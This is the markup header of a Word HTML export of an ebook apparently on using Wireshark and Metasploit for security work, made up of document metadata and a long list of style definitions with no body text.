<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:dt="uuid:C2F41010-65B3-11d1-A29F-00AA00C14882" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type  content="text/html; charset=gb2312" ><meta name=ProgId  content=Word.Document ><meta name=Generator  content="Microsoft Word 14" ><meta name=Originator  content="Microsoft Word 14" ><title>Wireshark for Security Professionals: Using Wireshark and the Metasploit Framework</title><!--[if gte mso 9]><xml><o:DocumentProperties><o:Author>Jeff T. Parker</o:Author><o:Keywords>#computers, #pw3</o:Keywords><o:LastAuthor>ËêÔÂÁ÷ÊÅ</o:LastAuthor><o:Revision>1</o:Revision><o:Pages>1</o:Pages><o:Lines>1</o:Lines><o:Paragraphs>1</o:Paragraphs></o:DocumentProperties><o:CustomDocumentProperties><o:Created dt:dt="dateTime.tz" >2018-12-17T00:00:00Z</o:Created><o:Creator dt:dt="string" >calibre (3.35.0) [https://calibre-ebook.com]</o:Creator><o:LastSaved dt:dt="dateTime.tz" >2018-12-17T00:00:00Z</o:LastSaved><o:KSOProductBuildVer dt:dt="string" >2052-11.1.0.8013</o:KSOProductBuildVer></o:CustomDocumentProperties></xml><![endif]--><!--[if gte mso 9]><xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml><![endif]--><!--[if gte mso 9]><xml><w:WordDocument><w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel><w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:DocumentKind>DocumentNotSpecified</w:DocumentKind><w:DrawingGridVerticalSpacing>7.8 °õ</w:DrawingGridVerticalSpacing><w:PunctuationKerning></w:PunctuationKerning><w:View>Web</w:View><w:Compatibility><w:DontGrowAutofit/><w:UseFELayout/></w:Compatibility><w:Zoom>0</w:Zoom></w:WordDocument></xml><![endif]--><!--[if gte mso 9]><xml><w:LatentStyles DefLockedState="false"  DefUnhideWhenUsed="true"  DefSemiHidden="true"  DefQFormat="false"  DefPriority="99"  LatentStyleCount="260" >
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Normal" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="heading 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="heading 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="heading 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="heading 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="heading 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="heading 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="heading 7" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="heading 8" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="heading 9" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 7" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 8" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index 9" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 7" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 8" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toc 9" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Normal Indent" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="footnote text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="annotation text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="header" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="footer" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="index heading" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  QFormat="true"  Name="caption" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="table of figures" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="envelope address" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="envelope return" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="footnote reference" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="annotation reference" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="line number" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="page number" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="endnote reference" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="endnote text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="table of authorities" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="macro" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="toa heading" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Bullet" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Number" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Bullet 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Bullet 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Bullet 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Bullet 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Number 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Number 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Number 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Number 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Title" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Closing" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Signature" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  Name="Default Paragraph Font" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Body Text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text Indent" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Continue" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Continue 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Continue 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Continue 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="List Continue 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Message Header" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Subtitle" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Salutation" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Date" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text First Indent" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text First Indent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Note Heading" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text Indent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Body Text Indent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Block Text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Hyperlink" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="FollowedHyperlink" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Strong" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="Emphasis" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Document Map" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Plain Text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="E-mail Signature" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Normal (Web)" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Acronym" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Address" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Cite" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Code" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Definition" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Keyboard" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Preformatted" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Sample" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Typewriter" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="HTML Variable" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  UnhideWhenUsed="false"  QFormat="true"  Name="Normal Table" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="annotation subject" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="No List" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="1 / a / i" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="1 / 1.1 / 1.1.1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="Article / Section" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Simple 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Simple 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Simple 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Classic 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Classic 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Classic 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Classic 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Colorful 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Colorful 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Colorful 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Columns 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Columns 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Columns 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Columns 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Columns 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 7" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid 8" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 7" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table List 8" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table 3D effects 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table 3D effects 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table 3D effects 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Contemporary" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Elegant" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Professional" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Subtle 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Subtle 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Web 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Web 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Web 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Balloon Text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Grid" ></w:LsdException>
<w:LsdException Locked="false"  Priority="0"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Table Theme" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="Placeholder Text" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="No Spacing" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="1"  SemiHidden="false"  UnhideWhenUsed="false"  QFormat="true"  Name="List Paragraph" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="Quote" ></w:LsdException>
<w:LsdException Locked="false"  Priority="99"  SemiHidden="false"  Name="Intense Quote" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 1" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 2" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 3" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 3" ></w:LsdException>
